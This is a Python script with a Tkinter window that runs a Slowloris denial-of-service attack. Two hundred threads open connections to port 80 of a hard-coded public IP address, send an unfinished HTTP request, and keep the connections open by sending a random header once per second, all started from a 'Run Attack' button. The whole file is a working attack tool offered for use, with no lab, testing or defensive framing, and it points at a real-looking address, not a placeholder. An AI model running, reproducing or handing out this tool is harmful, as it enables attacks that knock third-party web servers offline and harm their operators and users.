# slowloris_attack.py
import socket
import threading
import tkinter as tk
import time
import random
import string

TARGET_IP = "157.240.13.35"
PORT = 80
NUM_THREADS = 200  # Fewer threads, long-lived connections
stop_event = threading.Event()

def slow_thread(output, thread_id):
    packet_count = 0
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(10)
        sock.connect((TARGET_IP, PORT))
        sock.send(b"GET / HTTP/1.1\r\nHost: test.com\r\n")
        while packet_count < 100 and not stop_event.is_set():  # Limited packets per thread
            sock.send(b"X-a: " + ''.join(random.choices(string.ascii_letters, k=10)).encode() + b"\r\n")
            packet_count += 1
            output.insert(tk.END, f"[*] Thread {thread_id}: Sent {packet_count} partial requests\n")
            output.see(tk.END)
            time.sleep(1)  # Slow drip
        sock.send(b"\r\n")
        sock.close()
    except Exception as e:
        output.insert(tk.END, f"[!] Thread {thread_id} Failed: {e}\n")

def run_attack(output):
    output.delete(1.0, tk.END)
    output.insert(tk.END, f"[*] Starting Slowloris Attack on {TARGET_IP}:{PORT}...\n")
    threads = []
    stop_event.clear()
    start_time = time.time()
    for i in range(NUM_THREADS):
        t = threading.Thread(target=slow_thread, args=(output, i))
        t.daemon = True
        t.start()
        threads.append(t)
    time.sleep(15)
    stop_event.set()
    for t in threads:
        t.join(timeout=2)
    duration = time.time() - start_time
    output.insert(tk.END, f"[*] Completed in {duration:.2f}s\n")

root = tk.Tk()
root.title("Slowloris Attack")
root.geometry("600x400")
scrollbar = tk.Scrollbar(root)
output = tk.Text(root, height=20, width=70, yscrollcommand=scrollbar.set)
scrollbar.config(command=output.yview)
scrollbar.pack(side=tk.RIGHT, fill=tk.Y)
output.pack(pady=10)
tk.Button(root, text="Run Attack", command=lambda: threading.Thread(target=run_attack, args=(output,), daemon=True).start()).pack(pady=5)
tk.Button(root, text="Exit", command=root.quit).pack(pady=5)
root.mainloop()